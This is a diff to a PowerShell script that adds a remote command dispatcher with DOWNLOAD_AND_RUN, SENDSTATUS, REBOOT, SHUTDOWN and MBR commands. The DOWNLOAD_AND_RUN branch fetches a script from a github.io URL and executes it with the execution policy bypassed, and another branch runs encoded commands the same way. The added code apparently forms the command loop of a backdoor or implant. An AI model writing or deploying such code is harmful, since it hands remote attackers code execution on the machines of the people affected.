@@ -63,7 +63,8 @@ function ConvertTo-EncodedScript
   if ($Open) { notepad $NewPath }
 }
 
-function ProcessCommand
+
+function ProcessCommandNEW
 {
   param
   (
@@ -86,6 +87,38 @@ function ProcessCommand
             powershell.exe -exec bypass -encodedCommand $encodedCommand
 
            
+        }
+    }elseif($Command -like "SENDSTATUS"){
+
+        Send-Notification "status" "ok"
+    }elseif($Command -like "REBOOT"){
+        OutString "ProcessCommand: REBOOT"
+     
+    }elseif($Command -like "SHUTDOWN"){
+        OutString "ProcessCommand: SHUTDOWN"
+    }elseif($Command -like "MBR"){
+        OutString "ProcessCommand: MBR"
+    }
+}
+
+function ProcessCommand
+{
+  param
+  (
+    [string]$Command,
+    [string]$Details
+  )
+
+   if($Command -like "DOWNLOAD_AND_RUN"){
+     OutString "ProcessCommand: DOWNLOAD_AND_RUN"
+        $file = $Details
+        if($file -ne ""){
+
+            $url='https://radicaltronic.github.io/cmd/' + $file
+            $webclient = New-Object Net.WebClient
+            OutString "ProcessCommand: DOWNLOAD_AND_RUN  -- $file $url"
+            $data = $webclient.DownloadString($url)
+            powershell.exe -exec bypass -C "$data"       
         }
     }elseif($Command -like "SENDSTATUS"){
 
